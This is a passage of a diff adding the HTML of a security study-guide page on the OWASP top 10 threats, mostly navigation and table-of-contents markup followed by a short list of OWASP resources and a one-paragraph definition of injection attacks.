+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../11-firewalls-ids-and-honeypots/firewall-overview/" class="md-nav__link">
+        Firewall overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../11-firewalls-ids-and-honeypots/evading-firewalls/" class="md-nav__link">
+        Evading firewalls
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../11-firewalls-ids-and-honeypots/honeypot/" class="md-nav__link">
+        Honeypot
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          Web servers
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web servers" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          Web servers
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../12-web-servers/hacking-web-servers/" class="md-nav__link">
+        Hacking web servers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../12-web-servers/web-server-threats-and-attacks/" class="md-nav__link">
+        Web server threats and attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          Web applications
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web applications" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          Web applications
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hacking-web-applications/" class="md-nav__link">
+        Hacking web applications
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          OWASP top 10 threats
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        OWASP top 10 threats
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#injection" class="md-nav__link">
+    Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#types-of-injection-attacks" class="md-nav__link">
+    Types of injection attacks
+  </a>
+  
+    <nav class="md-nav" aria-label="Types of injection attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#code-injection" class="md-nav__link">
+    Code injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nosql-injection" class="md-nav__link">
+    NoSQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    LDAP injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#soap-injection" class="md-nav__link">
+    SOAP injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    Command injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    SQL injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-injection" class="md-nav__link">
+    Countermeasures for injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#broken-authentication" class="md-nav__link">
+    Broken authentication
+  </a>
+  
+    <nav class="md-nav" aria-label="Broken authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-broken-authentication" class="md-nav__link">
+    Example attacks for broken authentication
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-broken-authentication" class="md-nav__link">
+    Countermeasures for broken authentication
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sensitive-data-exposure" class="md-nav__link">
+    Sensitive data exposure
+  </a>
+  
+    <nav class="md-nav" aria-label="Sensitive data exposure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-sensitive-data-exposure" class="md-nav__link">
+    Example attacks for sensitive data exposure
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-sensitive-data-exposure" class="md-nav__link">
+    Countermeasures for sensitive data exposure
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-external-entities-xxe" class="md-nav__link">
+    XML External Entities (XXE)
+  </a>
+  
+    <nav class="md-nav" aria-label="XML External Entities (XXE)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-xml-external-entities-xxe" class="md-nav__link">
+    Example attacks for XML External Entities (XXE)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-xml-external-entities-xxe" class="md-nav__link">
+    Countermeasures for XML External Entities (XXE)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#broken-access-control" class="md-nav__link">
+    Broken access control
+  </a>
+  
+    <nav class="md-nav" aria-label="Broken access control">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacks-for-broken-access-control" class="md-nav__link">
+    Attacks for broken access control
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insecure-direct-object-references-idor" class="md-nav__link">
+    Insecure direct object references (IDOR)
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure direct object references (IDOR)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#missing-function-level-access-control" class="md-nav__link">
+    Missing Function Level Access Control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-broken-access-control" class="md-nav__link">
+    Countermeasures for broken access control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-misconfiguration" class="md-nav__link">
+    Security misconfiguration
+  </a>
+  
+    <nav class="md-nav" aria-label="Security misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerabilities-of-security-misconfiguration" class="md-nav__link">
+    Vulnerabilities of Security misconfiguration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-of-security-misconfiguration" class="md-nav__link">
+    Countermeasures of Security misconfiguration
+  </a>
+  
+    <nav class="md-nav" aria-label="Countermeasures of Security misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#security-hardening" class="md-nav__link">
+    Security hardening
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacks-of-security-misconfiguration" class="md-nav__link">
+    Attacks of Security misconfiguration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    Cross-Site Scripting (XSS)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#types-of-cross-site-scripting-xss" class="md-nav__link">
+    Types of Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threats-of-cross-site-scripting-xss" class="md-nav__link">
+    Threats of Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-cross-site-scripting-xss" class="md-nav__link">
+    Example attacks for Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-cross-site-scripting-xss" class="md-nav__link">
+    Countermeasures for Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure deserialization
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacks-for-insecure-deserialization" class="md-nav__link">
+    Attacks for insecure deserialization
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-insecure-deserialization" class="md-nav__link">
+    Countermeasures for insecure deserialization
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-components-with-known-vulnerabilities" class="md-nav__link">
+    Using components with known vulnerabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="Using components with known vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weaknesses-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Weaknesses for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-examples-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Attack examples for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Countermeasures for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insufficient-logging-and-monitoring" class="md-nav__link">
+    Insufficient logging and monitoring
+  </a>
+  
+    <nav class="md-nav" aria-label="Insufficient logging and monitoring">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weaknesses-for-insufficient-logging-and-monitoring" class="md-nav__link">
+    Weaknesses for insufficient logging and monitoring
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-insufficient-logging-and-monitoring" class="md-nav__link">
+    Countermeasures for insufficient logging and monitoring
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../denial-of-service/" class="md-nav__link">
+        Denial of service
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../session-hijacking/" class="md-nav__link">
+        Session hijacking
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          SQL injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          SQL injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../14-sql-injection/sql-injection-overview/" class="md-nav__link">
+        SQL injection overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../14-sql-injection/sql-injection-types/" class="md-nav__link">
+        SQL injection types
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          Cryptography
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cryptography" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          Cryptography
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/cryptography-overview/" class="md-nav__link">
+        Cryptography overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/encryption-algorithms/" class="md-nav__link">
+        Encryption algorithms
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/hashing-algorithms/" class="md-nav__link">
+        Hashing algorithms
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15_4" type="checkbox" id="__nav_15_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15_4">
+          Communication
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Communication" data-md-level="2">
+        <label class="md-nav__title" for="__nav_15_4">
+          <span class="md-nav__icon md-icon"></span>
+          Communication
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/encrypting-communication/" class="md-nav__link">
+        Encrypting communication
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/tunneling-protocols/" class="md-nav__link">
+        Tunneling protocols
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/encrypting-disk/" class="md-nav__link">
+        Encrypting disk
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15-cryptography/cryptanalysis/" class="md-nav__link">
+        Cryptanalysis
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Cloud
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cloud" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Cloud
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../16-cloud-computing/cloud-computing/" class="md-nav__link">
+        Cloud computing
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../16-cloud-computing/cloud-security/" class="md-nav__link">
+        Cloud security
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../16-cloud-computing/container-security/" class="md-nav__link">
+        Container security
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Mobile platforms
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Mobile platforms" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Mobile platforms
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../17-mobile-platforms/mobile-hacking/" class="md-nav__link">
+        Mobile hacking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../17-mobile-platforms/mobile-attack-vectors/" class="md-nav__link">
+        Mobile attack vectors
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../17-mobile-platforms/mobile-attacks/" class="md-nav__link">
+        Mobile attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          IoT and OT
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="IoT and OT" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          IoT and OT
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../18-iot-and-ot/iot-overview/" class="md-nav__link">
+        IoT overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../18-iot-and-ot/iot-security/" class="md-nav__link">
+        IoT security
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../19-exam-readiness/exam-readiness/" class="md-nav__link">
+        Exam readiness
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#injection" class="md-nav__link">
+    Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#types-of-injection-attacks" class="md-nav__link">
+    Types of injection attacks
+  </a>
+  
+    <nav class="md-nav" aria-label="Types of injection attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#code-injection" class="md-nav__link">
+    Code injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nosql-injection" class="md-nav__link">
+    NoSQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    LDAP injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#soap-injection" class="md-nav__link">
+    SOAP injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    Command injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    SQL injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-injection" class="md-nav__link">
+    Countermeasures for injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#broken-authentication" class="md-nav__link">
+    Broken authentication
+  </a>
+  
+    <nav class="md-nav" aria-label="Broken authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-broken-authentication" class="md-nav__link">
+    Example attacks for broken authentication
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-broken-authentication" class="md-nav__link">
+    Countermeasures for broken authentication
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sensitive-data-exposure" class="md-nav__link">
+    Sensitive data exposure
+  </a>
+  
+    <nav class="md-nav" aria-label="Sensitive data exposure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-sensitive-data-exposure" class="md-nav__link">
+    Example attacks for sensitive data exposure
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-sensitive-data-exposure" class="md-nav__link">
+    Countermeasures for sensitive data exposure
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-external-entities-xxe" class="md-nav__link">
+    XML External Entities (XXE)
+  </a>
+  
+    <nav class="md-nav" aria-label="XML External Entities (XXE)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-xml-external-entities-xxe" class="md-nav__link">
+    Example attacks for XML External Entities (XXE)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-xml-external-entities-xxe" class="md-nav__link">
+    Countermeasures for XML External Entities (XXE)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#broken-access-control" class="md-nav__link">
+    Broken access control
+  </a>
+  
+    <nav class="md-nav" aria-label="Broken access control">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacks-for-broken-access-control" class="md-nav__link">
+    Attacks for broken access control
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insecure-direct-object-references-idor" class="md-nav__link">
+    Insecure direct object references (IDOR)
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure direct object references (IDOR)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#missing-function-level-access-control" class="md-nav__link">
+    Missing Function Level Access Control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-broken-access-control" class="md-nav__link">
+    Countermeasures for broken access control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-misconfiguration" class="md-nav__link">
+    Security misconfiguration
+  </a>
+  
+    <nav class="md-nav" aria-label="Security misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerabilities-of-security-misconfiguration" class="md-nav__link">
+    Vulnerabilities of Security misconfiguration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-of-security-misconfiguration" class="md-nav__link">
+    Countermeasures of Security misconfiguration
+  </a>
+  
+    <nav class="md-nav" aria-label="Countermeasures of Security misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#security-hardening" class="md-nav__link">
+    Security hardening
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacks-of-security-misconfiguration" class="md-nav__link">
+    Attacks of Security misconfiguration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    Cross-Site Scripting (XSS)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#types-of-cross-site-scripting-xss" class="md-nav__link">
+    Types of Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threats-of-cross-site-scripting-xss" class="md-nav__link">
+    Threats of Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-attacks-for-cross-site-scripting-xss" class="md-nav__link">
+    Example attacks for Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-cross-site-scripting-xss" class="md-nav__link">
+    Countermeasures for Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure deserialization
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacks-for-insecure-deserialization" class="md-nav__link">
+    Attacks for insecure deserialization
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-insecure-deserialization" class="md-nav__link">
+    Countermeasures for insecure deserialization
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-components-with-known-vulnerabilities" class="md-nav__link">
+    Using components with known vulnerabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="Using components with known vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weaknesses-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Weaknesses for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-examples-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Attack examples for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-using-components-with-known-vulnerabilities" class="md-nav__link">
+    Countermeasures for using components with known vulnerabilities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insufficient-logging-and-monitoring" class="md-nav__link">
+    Insufficient logging and monitoring
+  </a>
+  
+    <nav class="md-nav" aria-label="Insufficient logging and monitoring">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weaknesses-for-insufficient-logging-and-monitoring" class="md-nav__link">
+    Weaknesses for insufficient logging and monitoring
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#countermeasures-for-insufficient-logging-and-monitoring" class="md-nav__link">
+    Countermeasures for insufficient logging and monitoring
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="owasp-top-10-threats">OWASP top 10 threats</h1>
+<ul>
+<li><a href="https://owasp.org/">OWASP</a>: open community dedicated for application security.</li>
+<li><a href="https://owasp.org/www-community/">OWASP Community Pages</a>: Wiki including controls, attacks, vulnerabilities for applications.</li>
+<li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>: Describes top 10 application security threats.</li>
+<li>💡 <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a> is a deliberately insecure application to test top 10 vulnerabilities.</li>
+<li>📝 Ordered from most common to least</li>
+<li><a href="#injection">Injection</a></li>
+<li><a href="#broken-authentication">Broken authentication</a></li>
+<li><a href="#sensitive-data-exposure">Sensitive data exposure</a></li>
+<li><a href="#xml-external-entities-xxe">XML external entities</a></li>
+<li><a href="#broken-access-control">Broken access control</a></li>
+<li><a href="#security-misconfiguration">Security misconfiguration</a></li>
+<li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
+<li><a href="#insecure-deserialization">Insecure deserialization</a></li>
+<li><a href="#using-components-with-known-vulnerabilities">Using components with known vulnerabilities</a></li>
+<li><a href="#insufficient-logging-and-monitoring">Insufficient logging and monitoring</a></li>
+</ul>
+<h2 id="injection">Injection</h2>
+<ul>
+<li>Injecting malicious data into commands and queries to execute in the application</li>
+<li>Targets input fields or entry points of the application</li>
+<li>The first on OWASP's top 10 list</li>
+<li>Very common as any source of data can be an injection vector.</li>
+</ul>
+<h3 id="types-of-injection-attacks">Types of injection attacks</h3>
+<h4 id="code-injection">Code injection</h4>
+<ul>
